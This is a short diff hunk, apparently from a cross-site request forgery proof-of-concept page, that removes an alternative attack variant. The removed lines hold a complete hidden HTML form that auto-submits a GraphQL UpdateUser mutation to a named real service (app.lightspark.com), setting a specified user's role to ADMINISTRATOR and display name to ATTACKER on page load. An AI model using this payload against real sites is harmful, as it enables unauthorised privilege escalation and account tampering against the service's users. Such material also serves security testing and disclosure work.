@@ -43,16 +43,5 @@ setTimeout(() => {
 
 </script>
 
-<!-- ALTERNATIVE: Pure HTML form method (requires server to accept form-encoded) -->
-
-<form id="csrfForm" method="POST" action="https://app.lightspark.com/graphql/frontend?n=UpdateUser&display_name=ATTACKER" style="display:none">
-  <input type="hidden" name="operationName" value="UpdateUser">
-  <input type="hidden" name="variables" value='{"user_id":"User:019b30de-b2a6-04f8-0000-43a25839294c","display_name":"ATTACKER","role":"ADMINISTRATOR","roles":["ADMINISTRATOR"]}'>
-  <input type="hidden" name="query" value='mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) { update_user(input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}) { __typename user { id display_name role __typename } } }'>
-</form>
-<script>
-  document.getElementById('csrfForm').submit();
-</script>
-
 </body>
 </html>
